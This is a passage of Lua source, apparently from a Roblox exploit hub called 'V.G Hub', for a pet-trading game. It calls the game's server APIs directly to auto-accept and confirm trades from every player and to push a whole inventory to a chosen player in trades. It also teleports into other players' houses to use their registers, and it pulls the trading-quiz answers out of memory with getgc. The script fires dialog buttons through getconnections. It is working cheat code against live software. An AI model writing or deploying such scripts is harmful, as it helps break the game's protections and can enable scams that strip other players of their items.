                    Pet = ReplicatedStorage.API["ToolAPI/Equip"]:InvokeServer(PetID)
                end)
            end
        end)

        if Key ~= nil then
            PetID = Key.unique
            ReplicatedStorage.API["ToolAPI/Unequip"]:InvokeServer(PetID)
            Pet, C = ReplicatedStorage.API["ToolAPI/Equip"]:InvokeServer(PetID)
        end

        spawn(autoPetLoop)
    end)

    Toggle = Tabs.Main:AddToggle("New1", { Title = "SwitchOutFullyGrown", Default = false })
    Toggle:OnChanged(function()
        SwitchOutFullyGrown = Options.New1.Value
        spawn(function()
            while SwitchOutFullyGrown and task.wait() do
                pcall(function()
                    local Pets = ClientData.get_data()[Player.Name].inventory.pets or {}
                    if Pets[PetID] and Pets[PetID].properties.age == 6 then
                        for _, v in pairs(Pets) do
                            if v.properties.age ~= 6 then PetID = v.unique end
                        end
                    end
                end)
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("New12", { Title = "SwitchOutEgg", Default = false })
    Toggle:OnChanged(function()
        SwitchOutEgg = Options.New12.Value
        spawn(function()
            while SwitchOutEgg and task.wait() do
                pcall(function()
                    local Pets = ClientData.get_data()[Player.Name].inventory.pets or {}
                    if Pets[PetID] and not Pets[PetID].id:match("egg") and not Pets[PetID].id:match("basic_egg") then
                        for _, v in pairs(Pets) do
                            if v.id:match("egg") and not v.id:match("basic_egg") then
                                PetID = v.unique
                            end
                        end
                    end
                end)
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("New123", { Title = "Switch Out same Pet Species", Default = false })
    Toggle:OnChanged(function()
        True = Options.New123.Value
        spawn(function()
            while True and task.wait() do
                pcall(function()
                    local Pets = ClientData.get_data()[Player.Name].inventory.pets or {}
                    for _, v in pairs(Pets) do
                        if v.id == sp and v.properties.age ~= 6 then
                            PetID = v.unique
                        end
                    end
                end)
            end
        end)
    end)

    Dropdown = Tabs.Main:AddDropdown("s", { Title = "Pets Species", Values = JoJo, Multi = false, Default = 1 })
    Dropdown:SetValue("DekuDimz")
    Dropdown:OnChanged(function(Value) sp = Value end)

    Toggle = Tabs.Main:AddToggle("New1231", { Title = "Auto use Age Pot", Default = false })
    Toggle:OnChanged(function()
        Grow = Options.New1231.Value
        spawn(function()
            while Grow and task.wait() do
                pcall(function()
                    local Foods = ClientData.get_data()[Player.Name].inventory.food or {}
                    local Tea
                    for _, v in pairs(Foods) do
                        if v.kind == "pet_age_potion" then Tea = v.unique break end
                    end
                    if not Tea then return end
                    task.wait(2)
                    local Pets = ClientData.get_data()[Player.Name].inventory.pets or {}
                    for _, v in next, Pets do
                        if v.kind == Petsc and v.properties.age ~= 6 then
                            PetID = v.unique
                            ReplicatedStorage.API["ToolAPI/Unequip"]:InvokeServer(PetID)
                            ReplicatedStorage.API["ToolAPI/Equip"]:InvokeServer(PetID)
                        end
                    end
                    ReplicatedStorage:FindFirstChild("PetObjectAPI/CreatePetObject", true)
                        :InvokeServer("__Enum_PetObjectCreatorType_2", { unique_id = Tea })
                    ReplicatedStorage:FindFirstChild("PetAPI/ConsumeFoodItem", true):FireServer(Tea)
                end)
            end
        end)
    end)

    Dropdown = Tabs.Main:AddDropdown("a", { Title = "Pets Use potion on", Values = List, Multi = false, Default = 1 })
    Dropdown:SetValue("DekuDimz")
    Dropdown:OnChanged(function(Value) Petsc = Value end)

    Toggle = Tabs.Main:AddToggle("Hi", { Title = "Healing Aura", Default = false })
    Toggle:OnChanged(function()
        HealOthers = Options.Hi.Value
        spawn(function()
            while HealOthers and task.wait(2) do
                ReplicatedStorage.API["MonitorAPI/HealWithDoctor"]:FireServer()
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("Hi1", { Title = "Anti Pick Up", Default = false })
    Toggle:OnChanged(function()
        Family = Options.Hi1.Value
        if Family then
            ReplicatedStorage.API["FamilyAPI/CreateFamily"]:InvokeServer()
        else
            ReplicatedStorage.API["FamilyAPI/LeaveFamily"]:InvokeServer()
        end
    end)

    Toggle = Tabs.Main:AddToggle("Hi2", { Title = "Auto buy egg", Default = false })
    Toggle:OnChanged(function()
        Loll = Options.Hi2.Value
        spawn(function()
            while Loll and task.wait() do
                pcall(function()
                    task.wait(1)
                    ReplicatedStorage.API["ShopAPI/BuyItem"]:InvokeServer("pets", Egg, {})
                end)
            end
        end)
    end)

    Dropdown = Tabs.Main:AddDropdown("a13", { Title = "Eggs", Values = Eggs, Multi = false, Default = 1 })
    Dropdown:SetValue("DekuDimz")
    Dropdown:OnChanged(function(Value) Egg = Value end)

    Toggle = Tabs.Main:AddToggle("Hi21", { Title = "Auto buy Gift", Default = false })
    Toggle:OnChanged(function()
        Loll = Options.Hi21.Value
        spawn(function()
            while Loll and task.wait() do
                pcall(function()
                    task.wait(1)
                    ReplicatedStorage.API["ShopAPI/BuyItem"]:InvokeServer("gifts", Gifts, {})
                end)
            end
        end)
    end)

    Dropdown = Tabs.Main:AddDropdown("a132", { Title = "Gifts", Values = gifts, Multi = false, Default = 1 })
    Dropdown:SetValue("DekuDimz")
    Dropdown:OnChanged(function(Value) Gift = Value end)

    Toggle = Tabs.Main:AddToggle("Hi3", { Title = "Auto Open Gifts", Default = false })
    Toggle:OnChanged(function()
        System = Options.Hi3.Value
        spawn(function()
            while System do
                task.wait(2)
                local giftList = ClientData.get_data()[Player.Name].inventory.gifts or {}
                for _, v in pairs(giftList) do
                    pcall(function()
                        ReplicatedStorage.API["ToolAPI/Equip"]:InvokeServer(v.unique)
                        ReplicatedStorage.API:FindFirstChild("ShopAPI/OpenGift"):InvokeServer(v.unique)
                    end)
                end
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("Hi4", { Title = "Auto Trade Apect Player", Default = false })
    Toggle:OnChanged(function()
        Trade = Options.Hi4.Value
        spawn(function()
            while Trade and task.wait() do
                pcall(function()
                    for _, v in pairs(Players:GetPlayers()) do
                        if v ~= Player then
                            ReplicatedStorage.API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest")
                                :InvokeServer(v, true)
                        end
                    end
                    ReplicatedStorage.API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
                    ReplicatedStorage.API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
                    for _, v in pairs(getconnections(
                        Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate.MouseButton1Click)) do
                        v.Function(); v:Fire()
                    end
                end)
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("Hi5", { Title = "Auto Buy from Player", Default = false })
    Toggle:OnChanged(function()
        Buy = Options.Hi5.Value
        spawn(function()
            while Buy and task.wait() do
                pcall(function()
                    ReplicatedStorage.API:FindFirstChild("RefreshmentStandAPI/BuyRefreshment")
                        :InvokeServer("hotdog_stand", Playt)
                    ReplicatedStorage.API:FindFirstChild("RefreshmentStandAPI/BuyRefreshment")
                        :InvokeServer("lemonade_stand", Playt)
                    for _, v in pairs(getconnections(
                        Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate.MouseButton1Click)) do
                        v.Function(); v:Fire()
                    end
                end)
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("Hi6", { Title = "Auto Buy from Register", Default = false })
    Toggle:OnChanged(function()
        Sus = Options.Hi6.Value
        spawn(function()
            while Sus and task.wait() do
                pcall(function()
                    local Is
                    if not Is then
                        GoToPersonsHouse(tostring(Playt))
                        local model = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model")
                        Player.Character.HumanoidRootPart.CFrame =
                            model:GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
                        task.wait(2)
                        Is = Cash()
                    end
                    if Is then
                        ReplicatedStorage.API:FindFirstChild("HousingAPI/ActivateFurniture")
                            :InvokeServer(Playt, Cash(), "UseBlock", 50, Player.Character)
                        for _, v in pairs(getconnections(
                            Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate.MouseButton1Click)) do
                            v.Function(); v:Fire()
                        end
                    end
                end)
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("Hi7", { Title = "Auto Transfer all to Player", Default = false })
    Toggle:OnChanged(function()
        TransferPet = Options.Hi7.Value
        spawn(function()
            while TransferPet and task.wait(1) do
                pcall(function()
                    if not Player.PlayerGui.TradeApp.Frame.Visible then
                        ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(Playt)
                    end
                    if Player.PlayerGui.TradeApp.Frame.Visible then
                        local inv = ClientData.get_data()[Player.Name].inventory
                        if Petsd == "Pets" then
                            for _, v in pairs(inv.pets) do
                                ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                            end
                        elseif Petsd == "GrownPets" then
                            for _, v in pairs(inv.pets) do
                                if v.properties.age == 6 then
                                    ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                                end
                            end
                        elseif Petsd == "Eggs" then
                            for _, v in pairs(inv.pets) do
                                if v.id:find("egg") and not v.id:find("_2022") then
                                    ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                                end
                            end
                        elseif Petsd == "Gifts" then
                            for _, v in pairs(inv.gifts) do
                                ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                            end
                        end
                        ReplicatedStorage.API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
                        ReplicatedStorage.API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
                        for _, v in pairs(getconnections(
                            Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate.MouseButton1Click)) do
                            v.Function(); v:Fire()
                        end
                    end
                end)
            end
        end)
    end)

    Dropdown = Tabs.Main:AddDropdown("s2", { Title = "Players", Values = Ps, Multi = false, Default = 1 })
    Dropdown:SetValue("DekuDimz")
    Dropdown:OnChanged(function(Value) Playt = Value end)

    Tabs.Main:AddButton({
        Title = "Grab Trading Linence",
        Description = "Grabs Trading Linence",
        Callback = function()
            ReplicatedStorage.API:FindFirstChild("TradeAPI/BeginQuiz"):FireServer()
            for _, v in pairs(getgc(true)) do
                if type(v) == "table" and rawget(v, "question_index") then
                    for _, q in pairs(v.quiz) do
                        ReplicatedStorage.API:FindFirstChild("TradeAPI/AnswerQuizQuestion"):FireServer(q.answer)
                    end
                end
            end
        end
    })

    Tabs.Main:AddButton({
        Title = "Go To Store",
        Description = "Goes to selected store",
        Callback = function()
            spawn(function()
                pcall(function()
                    GoToStore(Ass)
                    Player.Character.HumanoidRootPart.CFrame =
                        Workspace.Interiors:FindFirstChildWhichIsA('Model').Doors.MainDoor
                            .WorkingParts.TouchToEnter.CFrame:ToWorldSpace(CFrame.new(0, 0, -6))
                end)
            end)
        end
    })

    Dropdown = Tabs.Main:AddDropdown("s3", { Title = "Stores", Values = Stores, Multi = false, Default = 1 })
    Dropdown:SetValue("")
    Dropdown:OnChanged(function(Value) Ass = Value end)

    Tabs.Main:AddButton({
        Title = "Go To Home",
        Description = "Goes to House",
        Callback = function()
            spawn(function()
                GoToHome()
                local model = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA('Model')
                Player.Character.HumanoidRootPart.CFrame =
                    model:GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
            end)
        end
    })

    Tabs.Main:AddButton({
        Title = "Go To MainMap",
        Description = "Goes to MainMap",
        Callback = function()
            spawn(function()
                GoToMainMap()
                Player.Character.HumanoidRootPart.CFrame =
                    Workspace.Interiors:FindFirstChildWhichIsA("Model")
                        :GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(-247.35408, 17.3820152, -1518.88879)
            end)
        end
    })
end

--=====================================================================
-- SETTINGS
--=====================================================================
SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

Fluent:Notify({
    Title    = "V.G Hub",
    Content  = "The script has been loaded.",
    Duration = 8
})

SaveManager:LoadAutoloadConfig()
